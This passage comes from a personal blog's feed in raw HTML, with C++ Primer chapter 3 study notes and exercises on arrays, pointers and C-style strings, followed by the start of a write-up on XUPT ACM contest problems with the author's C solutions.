class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h2 id="3-5数组"><a href="#3-5数组" class="headerlink" title="3.5数组"></a>3.5数组</h2><h3 id="1-定义和初始化内置数组"><a href="#1-定义和初始化内置数组" class="headerlink" title="1.定义和初始化内置数组"></a>1.定义和初始化内置数组</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下几个例子由内向外的阅读，以求明白其真实含义。例如int （*parray)[10]=&arr;首先看括号里面，这是一个指针，再看右边，这个指针指向的是大小为10的数组，在看左边，这个数组是一个int类型的.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> *ptrs[<span class="number">10</span>]；           <span class="comment">//是一个含有十个整形指针的数组（指针数组）</span></div><div class="line"><span class="keyword">int</span> (*parray)[<span class="number">10</span>]=&amp;arr;   <span class="comment">//parray指向的是一个含有10个整数的数组</span></div><div class="line"><span class="keyword">int</span> (&amp;arrRef)[<span class="number">10</span>]=arr;    <span class="comment">//arrRef引用了一个含有十个整数的数组</span></div><div class="line"><span class="keyword">int</span> *(&amp;arry)[<span class="number">10</span>]=ptrs;    <span class="comment">//对于arry的引用，是一个10个指针的数组</span></div></pre></td></tr></table></figure></p><hr><ul><li>练习3.31：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> nums[<span class="number">10</span>];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</div><div class="line">nums[i] = i;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : nums)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; nums[i] &lt;&lt; <span class="string">" "</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h3 id="3-指针与数组"><a href="#3-指针与数组" class="headerlink" title="3.指针与数组"></a>3.指针与数组</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;begin()返回的是数组首元素的<strong>指针</strong>，end()返回的是数组<strong>尾元素下一个元素的指针</strong>，其中尾指针不能执行解引用和递增操作。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果两个指针分别指向不相干的对象，则不能比较他们。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指针加上一个整数还是一个指针，假设这个指针指向一个元素，则可以解引用这个指针。p=*(p+3);</p><ul><li>练习3.36<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> nums1[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</div><div class="line"><span class="keyword">int</span> nums2[<span class="number">5</span>] = &#123;<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,&#125;;</div><div class="line"><span class="keyword">int</span> *q, *p;</div><div class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (p = nums1, q = nums2; p &lt; nums1 + <span class="number">5</span>&amp;&amp;q&lt;nums2+<span class="number">5</span>;p++,q++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (*p != *q)</div><div class="line">&#123;</div><div class="line">flag = <span class="number">1</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">" 相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">" 不相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><h2 id="4-C语言风格字符串"><a href="#4-C语言风格字符串" class="headerlink" title="4.C语言风格字符串"></a>4.C语言风格字符串</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;字符串和字符数组，<strong>不以空字符结束的产生严重错误。</strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> str[]=<span class="string">"aedfefr"</span>；  <span class="comment">//字符串</span></div><div class="line"><span class="keyword">char</span> str2[]=&#123;<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'\0'</span>&#125;   <span class="comment">//字符数组，必须要'\0'结尾</span></div><div class="line"><span class="comment">/*--------*/</span></div><div class="line"><span class="keyword">char</span> str[]=&#123;<span class="string">'a'</span>,<span class="string">'a'</span>&#125;;         <span class="comment">//没有\0结尾</span></div><div class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">strlen</span>(str)&lt;&lt;<span class="built_in">endl</span>;     <span class="comment">//严重错误</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>使用string类型会更加安全</strong>。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>string对象加法中允许使用不多于1个的以空字符结尾的字符串类型。</strong>例如：cout&lt;&lt;string&lt;&lt;+&lt;&lt;”ssss””;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不能直接使用string来初始化char类型指针。<strong>可以使用c_str成员函数以返回c类型的字符串。</strong><br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">string s;</div><div class="line"><span class="keyword">char</span> *<span class="keyword">str</span> = s；  <span class="comment">//不能直接使用string来初始化char类型指针</span></div><div class="line"><span class="keyword">char</span> *<span class="keyword">str</span> = s.c_str();</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>使用数组来初始化vector对象，有两种方法，第一种是使用begin或者end标准库函数，第二种是使用地址指针。</strong><br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">vector &lt;int&gt; ivec(begin(nums),end(nums));    //使用标准库函数</div><div class="line">vecto &lt;int&gt; ivec(nums,nums+4);               //使用指针</div><div class="line"><span class="code">```</span>  </div><div class="line"></div><div class="line"><span class="bullet">* </span>练习3.39  </div><div class="line">---</div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    string str1 = “duehfuerhfuerh”;<br>    string str2 = “deuhdfuehfurhfuhr”;<br>    if (str1 == str2)<br>        cout &lt;&lt; “两个字符串相等” &lt;&lt; endl;<br>    else<br>        cout &lt;&lt; “两个字符串不相等” &lt;&lt; endl;<br>    const char ch_str1[] = “wudheuhd”;<br>    const char ch_str2[] = “edbdferyf”;<br>    if (strcmp(ch_str1, ch_str2) == 0)<br>        cout &lt;&lt; “两个C语言字符串相等” &lt;&lt; endl;<br>    else<br>        cout &lt;&lt; “两个C语言字符串不相等” &lt;&lt; endl;<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>练习3.40  </div><div class="line">---</div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    const char cstr1[5] = { ‘a’,’b’,’c’,’d’,’\0’ };  //一定要有终止符号<br>    const char cstr2[5] = { ‘e’,’f’,’g’,’h’,’\0’ };<br>    char cstr3[10] = { ‘\0’ };<br>    strcpy_s(cstr3, cstr1);<br>    strcat_s(cstr3, cstr2);<br>    cstr3[9] = ‘\0’;<br>    for (auto i : cstr3)<br>        cout &lt;&lt; i &lt;&lt; “ “;<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">---</span></div><div class="line"><span class="string">*</span> <span class="string">练习3.41</span></div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    int nums[4] = { 1,2,3,4 };<br>    vector &lt; int &gt; VectorNum(begin(nums), end(nums));<br>    for (auto i : VectorNum)<br>        cout &lt;&lt; i &lt;&lt; “ “;<br>    cout &lt;&lt; endl;<br>    vector &lt; int &gt; VectorNum2(nums, nums + 4);<br>    for (auto i : VectorNum2)<br>        cout &lt;&lt; i &lt;&lt; “ “;<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">---</span></div><div class="line"><span class="string">*</span> <span class="string">练习3.42</span></div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    vector <int> nums1 = { 1,2,3,4,5 };<br>    int nums2[5] = { 0 };<br>    for (auto i : nums1)<br>    {<br>        nums2[i] = i;<br>        cout &lt;&lt; nums2[i] &lt;&lt; endl;<br>    }<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">## 3.6多维数组</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;多维数组是数组的数组。使用for循环处理多维数组。但是需要注意得是，**我们需要将外层循环的控制变量申明为引用类型，这是为了避免数组被自动转化为指针。**</div></pre></td></tr></table></figure></int></p><p>int nums[3][4] = { {1,2,3,4},{5,6,7,8},{9,10,11,12}};<br>for (auto &amp;i : nums)   //外层一定要引用<br>{<br>    for(auto &amp;j:i)   //可以引用，也可以不引用<br>        cout &lt;&lt; j &lt;&lt; endl;<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;对于常见的for循环遍历数组，我们可以采用指针或者函数的方法。</div></pre></td></tr></table></figure></p><p>ia[3][5]={0}<br>for (auto p=ia;p!=ia+3;p++)<br>{<br>    for(auto q=<em>p;q!=</em>p+4;q++)<br>    {<br>        cout&lt;&lt;*q&lt;<endl; }="" <figure="" class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></endl;></p><p>ia[3][5]={0}<br>for (auto p=begin(ia);p!=end(ia);p++)<br>{<br>    for(auto q=begin(<em>p);q!=end(</em>p);q++)<br>    {<br>        cout&lt;&lt;*q&lt;<endl; }="" <figure="" class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">---</span></div><div class="line"><span class="string">*</span> <span class="string">练习3.43</span></div></pre></td></tr></table></endl;></p><p>int main(void)<br>{<br>    int nums[3][4] = { {1,2,3,4},{5,6,7,8},{9,10,11,12}};<br>    for (auto &amp;i : nums)<br>    {<br>        for(auto j:i)<br>            cout &lt;&lt; j &lt;&lt; endl;<br>    }<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    int nums[3][4] = { { 1,2,3,4 },{ 5,6,7,8 },{ 9,10,11,12 } };<br>    for (int i = 0; i &lt; 3; i++)<br>    {<br>        for (int j = 0; j &lt; 4; j++)<br>            cout &lt;&lt; nums[i][j] &lt;&lt; “ “;<br>        cout &lt;&lt; endl;<br>    }<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    int nums[3][4] = { { 1,2,3,4 },{ 5,6,7,8 },{ 9,10,11,12 } };<br>    for (auto <em>p = begin(nums);p!=end(nums);p++)   //外层循环控制子数组的遍历，是子数组首地址的值<br>    {<br>        for (auto </em>q = begin(<em>p); q != end(</em>p); q++)   //内层循环控制数组元素的遍历<br>        {<br>            cout &lt;&lt; *q &lt;&lt; “ “;<br>        }<br>        cout &lt;&lt; endl;<br>    }<br>    system(“pause”);<br>    return 0;<br>}<br>```</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;3-3：标准库类型-vector&quot;&gt;&lt;a href=&quot;#3-3：标准库类型-vector&quot; class=&quot;headerlink&quot; title=&quot;3.3：标准库类型 vector&quot;&gt;&lt;/a&gt;3.3：标准库类型 vector&lt;/h2&gt;&lt;h3 id=&quot;定义和初始化vector&quot;&gt;&lt;a href=&quot;#定义和初始化vector&quot; class=&quot;headerlink&quot; title=&quot;定义和初始化vector&quot;&gt;&lt;/a&gt;定义和初始化vector&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;标准库类型vector表示对象的集合，其中所有对象的类型都相同，vector中容纳着其他对象，所以被称为容器。类似于c语言中的动态数组。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1）引用不能成为vector的元素，因为引用不是对象（引用只是对象的别名）  &lt;/li&gt;
&lt;li&gt;2）可以使用花括号初始化每个值  &lt;/li&gt;
&lt;li&gt;3）使用括号指定元素个数或者相同元素值  &lt;/li&gt;
&lt;li&gt;4）根据类型编译器会决断括号内部含有的信息：vector &lt;string&gt; v7{10}   //V7有10个默认值  &lt;/string&gt;&lt;/li&gt;
&lt;li&gt;5) 初始化不准用赋值表达式
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
    
  </entry>
  
  <entry>
    <title>XUPT-ACM比赛部分题目解析</title>
    <link href="http://yoursite.com/2018/03/18/XUPT-ACM%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/03/18/XUPT-ACM比赛题解/</id>
    <published>2018-03-18T08:02:11.000Z</published>
    <updated>2018-03-25T08:37:02.391Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二次参加由软件科技协会举办的ACM比赛，感觉全程划水，看见大佬在电脑前面啪啪啪（拟声词）的敲着代码，我在旁边懒癌发作吃着干粮。<br><a id="more"></a></p><h2 id="A题：小明坐火车"><a href="#A题：小明坐火车" class="headerlink" title="A题：小明坐火车"></a>A题：小明坐火车</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p>  <img src="https://i.imgur.com/EaUWTgC.jpg" alt=""><br>  <img src="https://i.imgur.com/wHgW0Do.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;唯一有坑的地方就是关于每站间隔时间不一定只是大于60min（还有可能大于120，160啥的）<strong>此处有while循环，原谅我思考问题不全面吧。（应该不可原谅）</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">int</span> main(void)</div><div class="line">&#123;</div><div class="line"><span class="built_in">int</span> <span class="built_in">hour</span>,<span class="built_in">min</span>;</div><div class="line"><span class="built_in">int</span> <span class="built_in">n</span>;</div><div class="line"><span class="built_in">int</span> <span class="built_in">time</span>[<span class="number">100</span>];</div><div class="line"><span class="built_in">int</span> i;</div><div class="line">while(scanf(<span class="string">"%d:%d"</span>,&amp;<span class="built_in">hour</span>,&amp;<span class="built_in">min</span>)!=EOF)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;<span class="built_in">n</span>);</div><div class="line">for(i=<span class="number">1</span>;i&lt;<span class="built_in">n</span>;i++)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;<span class="built_in">time</span>[i]);</div><div class="line">&#125;</div><div class="line">for(i=<span class="number">1</span>;i&lt;<span class="built_in">n</span>;i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">min</span>+=<span class="built_in">time</span>[i];</div><div class="line">while(<span class="built_in">min</span>&gt;=<span class="number">60</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">min</span>-=<span class="number">60</span>;</div><div class="line"><span class="built_in">hour</span>+=<span class="number">1</span>;</div><div class="line"><span class="built_in">if</span>(<span class="built_in">hour</span>&gt;=<span class="number">24</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">hour</span>-=<span class="number">24</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"%02d:%02d\n"</span>,<span class="built_in">hour</span>,<span class="built_in">min</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="F题：太阳的后裔"><a href="#F题：太阳的后裔" class="headerlink" title="F题：太阳的后裔"></a>F题：太阳的后裔</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p>   <img src="https://i.imgur.com/LAVYpWW.jpg" alt=""><br>   <img src="https://i.imgur.com/CEXF5z3.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这道题我开始想的是利用遍历的方法，遍历整个数组，如果当前数字是0的话，sum++；同时判断左边和下边的数是否为0，如果为0同样sum++，最后设置该数是2，作为遍历的标志但是，但是，这道题是判断连通域的题，应该用到dfs，深度优先搜索。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所谓深度优先搜索是指：在某个节点上，按照某种顺序不断的向深层次的符合条件的节点递归，遇到不符合条件的逐层返回，知道所有节点都遍历完成。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们先判断num数组本身和book标志是否同时为0，如果同时为0，则调用dfs函数进行深度优先搜索。函数内部判断的条件是num和book数组数据是否为0，以及是否处于边界条件之内。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">int N,M;</div><div class="line">int num[500][500];</div><div class="line">int <span class="attribute">sum</span>=0;</div><div class="line">int next[4][2]=&#123;&#123;1,0&#125;,&#123;0,1&#125;,&#123;-1,0&#125;,&#123;0,-1&#125;&#125;;</div><div class="line">int <span class="attribute">max</span>=0;</div><div class="line">int book[500][500]=&#123;0&#125;;</div><div class="line">int qi[1000];</div><div class="line">int qj[1000];</div><div class="line">void bfs(int i,int j)</div><div class="line">&#123;</div><div class="line">int <span class="attribute">t</span>=0;</div><div class="line">int ni,nj;</div><div class="line">int <span class="attribute">wei</span>=0;</div><div class="line">int <span class="attribute">tou</span>=0;</div><div class="line">qi[wei]=i;</div><div class="line">qj[wei]=j;</div><div class="line">book[i][j]=1;</div><div class="line">wei++;</div><div class="line"><span class="attribute">sum</span>=0;</div><div class="line"><span class="keyword">while</span>(1)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(<span class="attribute">tou</span>==wei)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(sum&gt;max)</div><div class="line">&#123;</div><div class="line"><span class="attribute">max</span>=sum;</div><div class="line">&#125;</div><div class="line">break;</div><div class="line">&#125;</div><div class="line"><span class="attribute">i</span>=qi[tou];</div><div class="line"><span class="attribute">j</span>=qj[tou];</div><div class="line">tou++;</div><div class="line">sum++;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">t</span>=0;t&lt;4;t++)</div><div class="line">&#123;</div><div class="line"><span class="attribute">ni</span>=i+next[t][0];</div><div class="line"><span class="attribute">nj</span>=j+next[t][1];</div><div class="line"><span class="keyword">if</span>(num[ni][nj]==0&amp;&amp;book[ni][nj]==0&amp;&amp;ni&lt;N&amp;&amp;nj&lt;M&amp;&amp;ni&gt;=0&amp;&amp;nj&gt;=0)</div><div class="line">&#123;</div><div class="line">qi[wei]=ni;</div><div class="line">qj[wei]=nj;</div><div class="line">wei++;</div><div class="line">book[ni][nj]=1;</div><div class="line">    &#125;</div><div class="line">    &#125; </div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int i,j;</div><div class="line">scanf(<span class="string">"%d %d"</span>,&amp;N,&amp;M);</div><div class="line"><span class="keyword">for</span>(<span class="attribute">i</span>=0;i&lt;N;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">j</span>=0;j&lt;M;j++)</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;num[i][j]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">i</span>=0;i&lt;N;i++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">for</span>(<span class="attribute">j</span>=0;j&lt;M;j++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(num[i][j]==0&amp;&amp;book[i][j]==0)</div><div class="line">&#123;</div><div class="line">dfs(i,j);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"%d"</span>,max);</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="K题：黑客帝国"><a href="#K题：黑客帝国" class="headerlink" title="K题：黑客帝国"></a>K题：黑客帝国</h2><h3 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h3><p>   <img src="https://i.imgur.com/bjDlvbN.jpg" alt=""><br>   <img src="https://i.imgur.com/6auvIzA.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输入用数组存储，指令用一个三位数表示，当时每个位数代表着不同的含义，首先我们应该表示同一个数的不同位。<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">int a[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">int jc[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">int n=<span class="number">0</span>;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;n);</div><div class="line">int i=<span class="number">0</span>;</div><div class="line">for(i;i&lt;n;i++)</div><div class="line">&#123;</div><div class="line">scanf(<span class="string">"%d"</span>,&amp;a[i]);</div><div class="line">&#125;</div><div class="line">int sum=<span class="number">0</span>;</div><div class="line">i=<span class="number">0</span>;</div><div class="line">while(<span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">f(a[i]);</div><div class="line">sum++;</div><div class="line">switch(b[<span class="number">0</span>])</div><div class="line">&#123;</div><div class="line">case <span class="number">0</span>:</div><div class="line">if(jc[b[<span class="number">2</span>]]!=<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">i=jc[b[<span class="number">1</span>]];</div><div class="line">continue;</div><div class="line">&#125;</div><div class="line">break;</div><div class="line">case <span class="number">1</span>:</div><div class="line">if(b[<span class="number">1</span>]==<span class="number">0</span>&amp;&amp;b[<span class="number">2</span>]==<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"%d"</span>,sum);</div><div class="line">     return <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">break;</div><div class="line">case <span class="number">2</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=b[<span class="number">2</span>];</div><div class="line">break;</div><div class="line">case <span class="number">3</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]+b[<span class="number">2</span>];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">4</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]*b[<span class="number">2</span>];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">5</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">2</span>]];</div><div class="line">break;</div><div class="line">case <span class="number">6</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span 